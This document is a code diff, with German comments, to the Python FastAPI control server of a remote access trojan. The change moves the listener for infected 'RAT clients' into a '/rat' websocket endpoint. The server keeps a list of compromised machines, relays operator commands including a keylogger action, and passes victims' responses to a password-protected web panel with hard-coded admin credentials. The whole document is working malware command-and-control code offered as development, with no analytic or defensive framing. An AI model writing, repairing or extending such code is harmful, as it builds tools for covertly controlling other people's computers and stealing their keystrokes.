@@ -6,7 +6,6 @@ from datetime import datetime
 import secrets
 
 import uvicorn
-import websockets
 from fastapi import (
     FastAPI,
     WebSocket,
@@ -30,7 +29,7 @@ ADMIN_USERNAME = "admin"
 ADMIN_PASSWORD = "supersecretpassword123"
 
 
-# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN (unverändert) ---
+# --- AUTH-FUNKTION FÜR NORMALE HTTP-ROUTEN ---
 async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
     correct_username = secrets.compare_digest(
         credentials.username, ADMIN_USERNAME
@@ -47,12 +46,8 @@ async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)
     return credentials.username
 
 
-# --- NEUE AUTH-FUNKTION SPEZIELL FÜR WEBSOCKETS ---
+# --- AUTH-FUNKTION FÜR WEB-UI WEBSOCKETS ---
 async def get_current_user_ws(websocket: WebSocket):
-    """
-    Diese Funktion liest die Auth-Header manuell aus dem WebSocket-Scope.
-    Sie wird als Abhängigkeit für den WebSocket-Endpunkt verwendet.
-    """
     auth_header = websocket.headers.get("authorization")
     if not auth_header:
         await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
@@ -81,25 +76,24 @@ async def get_current_user_ws(websocket: WebSocket):
     return username
 
 
-# --- Web-UI Endpunkte (jetzt mit korrekten Dependencies) ---
-
+# --- Web-UI Endpunkte ---
 @app.get("/", dependencies=[Depends(get_current_user)])
 async def get_index():
     return FileResponse("index.html")
 
 
-@app.websocket("/ws", dependencies=[Depends(get_current_user_ws)]) # KORRIGIERT
+@app.websocket("/ws", dependencies=[Depends(get_current_user_ws)])
 async def websocket_endpoint(websocket: WebSocket):
     global WEB_UI_SOCKET
     await websocket.accept()
     WEB_UI_SOCKET = websocket
     print("Web-UI verbunden und authentifiziert.")
-    # ... (Rest der Funktion bleibt unverändert)
+    
     await send_to_web_ui(
         {
             "type": "client_list",
             "clients": [
-                {"id": cid, "address": ws.remote_address}
+                {"id": cid, "address": getattr(ws, 'remote_address', 'unknown')}
                 for cid, ws in RAT_CLIENTS.items()
             ],
         }
@@ -125,8 +119,8 @@ async def websocket_endpoint(websocket: WebSocket):
             elif action == "keylogger":
                 payload["count"] = data.get("count")
             try:
-                await target_ws.send(json.dumps(payload))
-            except websockets.ConnectionClosed:
+                await target_ws.send_json(payload)
+            except Exception:
                 await send_to_web_ui(
                     {"type": "error", "message": f"Verbindung zu Client {target_id} verloren."}
                 )
@@ -135,33 +129,36 @@ async def websocket_endpoint(websocket: WebSocket):
         WEB_UI_SOCKET = None
 
 
-# --- RAT-Client Handler und Server-Lebenszyklus (unverändert) ---
-
-async def send_to_web_ui(data: dict):
-    if WEB_UI_SOCKET:
-        try:
-            await WEB_UI_SOCKET.send_json(data)
-        except Exception:
-            pass
-
-async def rat_handler(websocket):
+# --- RAT-Client WebSocket Endpunkt (NEU) ---
+@app.websocket("/rat")
+async def rat_client_endpoint(websocket: WebSocket):
     global CLIENT_COUNTER
+    await websocket.accept()
+    
     client_id = CLIENT_COUNTER
     CLIENT_COUNTER += 1
     RAT_CLIENTS[client_id] = websocket
-    print(f"[+] Neuer RAT-Client verbunden: ID {client_id} von {websocket.remote_address}")
+    
+    # Remote address für FastAPI WebSocket
+    client_host = websocket.client.host if websocket.client else "unknown"
+    client_port = websocket.client.port if websocket.client else 0
+    remote_address = (client_host, client_port)
+    websocket.remote_address = remote_address
+    
+    print(f"[+] Neuer RAT-Client verbunden: ID {client_id} von {remote_address}")
     await send_to_web_ui(
         {
             "type": "client_connected",
-            "client": {"id": client_id, "address": websocket.remote_address},
+            "client": {"id": client_id, "address": remote_address},
         }
     )
+    
     try:
-        async for message in websocket:
-            response = json.loads(message)
-            response["client_id"] = client_id
-            await send_to_web_ui(response)
-    except websockets.ConnectionClosed:
+        while True:
+            data = await websocket.receive_json()
+            data["client_id"] = client_id
+            await send_to_web_ui(data)
+    except WebSocketDisconnect:
         print(f"[-] RAT-Client {client_id} hat die Verbindung getrennt.")
     finally:
         if client_id in RAT_CLIENTS:
@@ -169,28 +166,13 @@ async def rat_handler(websocket):
             await send_to_web_ui({"type": "client_disconnected", "client_id": client_id})
 
 
-async def start_rat_server():
-    host = "0.0.0.0"
-    port = 8765
-    print(f"[*] RAT-Listener startet auf ws://{host}:{port}")
-    async with websockets.serve(rat_handler, host, port):
-        await asyncio.Future()
-
-
-@app.on_event("startup")
-async def on_startup():
-    task = asyncio.create_task(start_rat_server())
-    app.state.rat_server_task = task
-
-
-@app.on_event("shutdown")
-async def on_shutdown():
-    print("Fahre Server herunter, beende RAT-Listener-Task...")
-    app.state.rat_server_task.cancel()
-    try:
-        await app.state.rat_server_task
-    except asyncio.CancelledError:
-        print("RAT-Listener-Task erfolgreich beendet.")
+# --- Hilfsfunktion ---
+async def send_to_web_ui(data: dict):
+    if WEB_UI_SOCKET:
+        try:
+            await WEB_UI_SOCKET.send_json(data)
+        except Exception:
+            pass
 
 
 if __name__ == "__main__":
